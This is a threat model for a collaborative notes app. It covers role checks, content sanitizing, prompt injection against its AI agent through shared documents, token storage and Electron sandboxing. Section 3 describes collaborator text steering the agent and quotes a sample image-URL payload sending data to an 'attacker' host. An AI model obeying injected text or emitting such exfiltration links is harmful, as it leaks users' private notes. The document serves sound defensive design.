# Collaboration threat model

Phase 4 review of the trust boundaries in [README.md §10](README.md#10-security-boundaries) and [source-plan.md §7](source-plan.md#7-electron-specifics). For each boundary: who is trusted, what is enforced and where, and what is still open.

## Actors and assets

| Actor | Trusted with |
|---|---|
| The local user | Everything on their own machine. |
| A collaborator (another account in a shared project) | Nothing beyond their role. Their text, comments, file names, LaTeX and images are **untrusted input** on every other member's machine. |
| AI features and the agent | Nothing they can decide. They act for the local user, but shared content can steer them (prompt injection). |
| Other local processes and web pages | Nothing. They can reach `127.0.0.1` ports. |
| The server operator | The shared documents and the account database. Not the user's local notes or the device. |

What we protect: unshared local notes and files, the user's credentials (collaboration tokens, the app password, the OpenRouter key), the integrity of shared documents (no silent loss, no forged decisions), and the device itself (no code execution from content).

## 1. Roles are enforced by the server

| What | Where |
|---|---|
| Every REST route checks the account's role for the action (`requireDocumentAction`, `requireProjectAction`, with the actor, so an AI actor gets `ai-cannot-decide`). | `server/src/auth/access.ts` |
| Sync: `open` checks document access; every update is checked per sub-document (`canWriteSubdoc`) and rejected with `forbidden` otherwise; annotation records are owner-checked (`annotation-ownership`). | `server/src/sync/session.ts`, `server/src/sync/validate.ts` |
| Role changes, member removal and account revocation are pushed to open rooms, which re-check or close the account's documents (`access-revoked`). | `server/src/sync/`, `server/src/admin/routes.ts` |
| The client role is a UI hint only. The host turns a rejection into a rollback with "Copy my unsynced text"; it never trusts its own idea of the role. | `electron/collab/core/doc-hub.ts` |

**Remaining:** a member who has a role can read everything in the project for as long as they have it, and keeps any copy they made. Revocation stops future sync, not what is already on their disk.

## 2. Collaborator content is untrusted

### Rendering

| What | Where |
|---|---|
| Raw HTML in Markdown is never interpreted. react-markdown turns `raw` nodes into text; the sanitizer does the same in the preview worker. | `src/components/markdown-renderer.tsx`, `src/lib/markdown-sanitize.ts` |
| An allowlist sanitizer runs on every rendered tree: the renderer (direct and worker-prepared blocks), the preview worker, slides, search previews and the PDF export page (all use `MarkdownRenderer`), and on the HTML string of resting PDF notes before it reaches `innerHTML`. It drops `script`, `style`, `iframe`, `object`, `embed`, forms, `foreignObject`, `annotation-xml` and similar, unwraps unknown elements, drops every attribute not on the list (so every `on*` handler), empties `javascript:`, `data:`, `vbscript:` and `file:` links, and drops inline styles with `url()`, `expression()`, imports, escapes or fixed positioning. | `src/lib/markdown-sanitize.ts`, `src/lib/pdf-annotation-markdown.ts` |
| Images in a shared notebook: only `https:` and the notebook's own assets load. `http:`, scheme-relative, other same-origin paths and `data:` images show as alt text, so a collaborator cannot make readers fetch a tracking URL or hit a local route with the app's cookies. Local notes keep their previous rules. | `safeImageUrl` in `markdown-sanitize.ts`; trust from `contentTrust` or the collaboration status |
| KaTeX runs with `trust: false` everywhere (`\href`, `\includegraphics`, `\htmlStyle` and similar are refused). | `markdown-renderer.tsx` (rehype-katex defaults), `pdf-annotation-markdown.ts`, `tiptap-markdown-editor.tsx` |
| Comment bodies, suggestion reasons, notification text and member names are rendered as React text, never as HTML. | `markdown-review-ui.tsx`, `collab/notifications-bell.tsx`, `collab/**` |
| The WYSIWYG editor parses Markdown through the TipTap schema; only schema nodes and marks exist, and links use TipTap's protocol check. | `src/lib/tiptap-markdown.ts` |
| Tests: a table of hostile inputs, plus proof that the sanitized tree equals the unsanitized one for all Libera syntax. | `scripts/collab/p4d-sanitize.test.ts` |

**Remaining:**
- Shared-document detection uses the first path segment against the shared notebooks in the host status. Windows without the collaboration bridge (the hidden PDF export window) render with the local rules, so an export of a shared note can load its `http:` images.
- AI chat and agent output are rendered with the local rules. Text that a prompt injection got the model to write (for example an image URL carrying data) is treated like the user's own note. See §3.
- Links are not filtered by host: a collaborator can link to any `https:` site. Clicking opens it in the system browser.
- `id` attributes from footnotes are kept as GFM writes them (`user-content-` prefix); there is no general DOM-clobbering guard because raw HTML cannot create elements.

### LaTeX builds

| What | Where |
|---|---|
| Builds run with `shell_escape=f`, `openin_any=p`, `openout_any=p` (and `-no-shell-escape` for exports), so a shared `.tex` cannot run commands or read and write outside the build directory. | `src/lib/latex/build.ts`, `src/lib/latex-export.ts` |

**Remaining:** TeX is Turing complete. A hostile document can still burn CPU for the 4-minute compile timeout or produce a huge PDF.

### File names from the manifest

| What | Where |
|---|---|
| The server rejects manifest entries whose paths are absolute, contain `.` or `..` or empty segments, forbidden or control characters, Windows reserved names, trailing dots or spaces, or the reserved `.libera` prefix (`manifestPathError`). | `src/lib/collab/protocol/schema.ts`, `server/src/sync/validate.ts` |
| The host validates again before touching disk. Entries that would clash on a case-insensitive file system (same `manifestPathKey`: NFC, lower case) get one deterministic winner and visible suffixes for the rest, so no two entries write one file. | `electron/collab/notebooks/service.ts`, `layout.ts` |
| Content is never passed to a shell or used as a path except through those checks. | (source plan §7) |

**Remaining:** clashing names are renamed on disk ("notes (2).md"), so the on-disk name can differ from the shared name; a collaborator can use that to make a file look like another one in the file tree.

## 3. AI and prompt injection through shared content

A collaborator can write text aimed at another member's AI: in a document, a comment, a file name, or an `AGENT_NOTES.md` in the shared notebook.

| What | Where |
|---|---|
| AI can never decide. The server refuses review approvals and suggestion accept/reject from an actor of kind `ai` (`ai-cannot-decide`), whatever the user's role. | `server/src/auth/access.ts`, `server/src/api/reviews.ts` |
| The agent cannot write to a shared notebook: its file tools refuse shared paths and tell the model to describe the change instead. AI features that edit shared documents go through the host with `provenance` and create suggestions, which a human accepts. | `src/lib/agent/tools.ts`, `src/lib/collab/shared-notebook.ts`, `electron/collab/control/routes-docs.ts` |
| Every AI-originated update carries provenance into the server's update log, so it is attributable and revertible. | `src/lib/collab/protocol/actor.ts`, server update log |

**Remaining:**
- Injection can still steer what the model **says** to the local user and what it **reads**: the agent can read shared notes and, within its permissions, other local files, and could be told to quote them into a suggestion that collaborators see. Suggestions are visible and must be accepted, but nothing stops the text of a pending suggestion from containing data.
- AI chat output is rendered with the local image rules (§2), so a model tricked into writing `![](http://attacker/?q=…)` would load that URL. Rendering AI output with `contentTrust="shared"` closes this; it is not done yet.
- The model provider receives whatever context the user's AI features send, including shared content.

## 4. Tokens and local surfaces

### Collaboration tokens

| What | Where |
|---|---|
| Access tokens are short-lived JWTs (15 min) kept in memory only. | `electron/collab/control/account.ts` |
| Refresh tokens rotate on every use; refreshes are single-flight so two refreshes never race. | `account.ts`, `core/sync-client.ts` |
| The refresh token is encrypted by the main process with Electron `safeStorage` (`session.bin`). On Linux with the `basic_text` backend, or without safeStorage, it stays in memory and the user signs in each launch. | `electron/collab-host.cjs` (`handleSecret`), `account.ts` |
| Diagnostics and telemetry never include tokens, emails, document text or names: telemetry is counts only; diagnostics are built from ids and counts and then scrubbed (forbidden keys removed, tokens, emails and paths redacted in strings). | `core/telemetry.ts`, `control/routes-diagnostics.ts`, tests in `p4d-telemetry.test.ts` and `p4d-diagnostics.test.ts` |

**Remaining:** anything running as the user can ask `safeStorage` (the OS keychain) for the same secret while Libera's process identity is unlocked; this is the usual desktop limit.

### The host control API

| What | Where |
|---|---|
| Binds to `127.0.0.1` only, with a per-launch random bearer token compared in constant time, and answers only `Host: 127.0.0.1:<port>` or `localhost:<port>` (DNS rebinding). A web page cannot add the bearer header without a CORS preflight, which the API does not grant. | `electron/collab/control/server.ts` |
| The token is given only to the Next server's environment; the renderer reaches the host through `/api/collab/*`, which requires the app session and adds the token server-side. | `electron/collab-host.cjs`, `src/app/api/collab/[...path]/route.ts` |
| Renderers get MessagePorts to documents only from trusted app frames (`isTrustedFrame`). | `collab-host.cjs` |

**Remaining:** a local process running as the same user can read the Next server's environment or memory and so the token. The control API is not a boundary against the user's own malware.

### Renderer sandbox

| What | Where |
|---|---|
| The main, setup, PDF-export and pop-out windows set `sandbox: true`, `contextIsolation: true`, `nodeIntegration: false`. Electron 20+ also defaults to the sandbox; the explicit flag guards against regressions. | `electron/main.cjs` |
| The preload uses only sandbox-safe modules (`electron`'s contextBridge, ipcRenderer, webFrame) and exposes a fixed set of `window.libera*` functions; anything that needs Node runs in main behind IPC. | `electron/preload.cjs` |
| A test loads the real preload into a sandboxed Electron window and compares every API with an unsandboxed load. | `scripts/collab/p4d-sandbox.test.ts` |
| Navigation is limited: child windows only for known same-origin pages, external URLs go to the system browser. | `main.cjs` (`setWindowOpenHandler`, `will-navigate`) |

**Remaining:**
- The preferences overlay (`electron/preferences-overlay.cjs`) does not set `sandbox` explicitly; it relies on Electron's default.
- IPC handlers in main are the real boundary now. They validate their inputs individually; there is no central schema check, and a renderer compromise could call any exposed channel.
- No Content-Security-Policy is set on the app pages, so a sanitizer gap would not be backstopped by CSP.

## 5. Operations

| What | Where |
|---|---|
| The hourly divergence check compares each fully acked replica with the server's digest at equal state vectors, recovers by re-opening with the server's full state (never discarding local data), and reports failures as a telemetry counter the server alerts on. | `electron/collab/core/divergence.ts`, `server/src/admin/digest.ts`, `server/src/admin/telemetry.ts` |
| Telemetry respects the server's rate limit (6 reports per minute per account, `retry-after`) and is off while signed out. | `core/telemetry.ts` |

**Remaining:** a divergence the full re-open cannot fix (local deletions the server never received) stays reported as "unresolved" for an operator; the host does not push delete-only state on its own.
